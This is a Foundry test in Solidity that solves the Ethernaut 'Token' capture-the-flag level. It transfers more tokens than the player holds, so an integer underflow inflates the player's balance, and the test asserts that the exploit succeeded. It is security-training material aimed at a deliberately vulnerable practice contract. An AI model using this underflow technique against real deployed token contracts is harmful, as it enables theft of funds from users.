// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TokenExploitTest is Test {
    Token public token;

    // Create test addresses
    address player = makeAddr("player");
    address recipient = makeAddr("recipient");

    function setUp() public {
        // Simulate the Ethernaut setup where the contract is deployed
        // with an  iniial supply assigned to the player (e.g., 20 tokens)
        vm.prank(player);
        token = new Token(20);
    }

    function testTokenUnderFlow() public {
        // 1. Assert initial state: Player starts with 20 tokens
        assertEq(token.balanceOf(player), 20, "Initial balance should be 20");

        // 2.Execute the attack from the player's address
        vm.startPrank(player);

        // Transfer 21 tokens.
        // 20 - 21 wraps around to type(uint256).max due to pre-0.8.0 underflow.
        token.transfer(recipient, 21);

        vm.stopPrank();

        // 3. Verify exploit success: Player balance is now massively inflated
        assertGt(token.balanceOf(player), 20, "Underflow failed to inflate balance");

        // Log the final inflated balance to the console
        console.log("Exploit successsfull! New player balance.");
        console.logUint(token.balanceOf(player));
    }
}
